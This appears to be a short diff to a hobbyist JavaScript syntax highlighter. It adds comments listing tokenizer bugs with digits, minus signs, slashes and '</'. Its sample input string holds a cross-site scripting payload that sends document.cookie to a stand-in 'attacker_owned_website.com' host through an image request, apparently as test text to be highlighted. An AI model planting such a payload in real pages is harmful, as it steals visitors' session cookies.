@@ -1,5 +1,10 @@
 // Syntax Highlighter by Hackerry
 
+// Bug 1: 30*20 not highlighting digits
+// Bug 2: -100 is treated as pointer, missing - in division
+// Bug 3: / is treated as comment deliminator, missing / in division
+// Bug 4: </ causes infinite loop
+
 var data = String.raw`<script>
     var fakeImage = document.createElement("img");
     fakeImage.src = "attacker_owned_website.com/image.png?cookie=" + document.cookie;
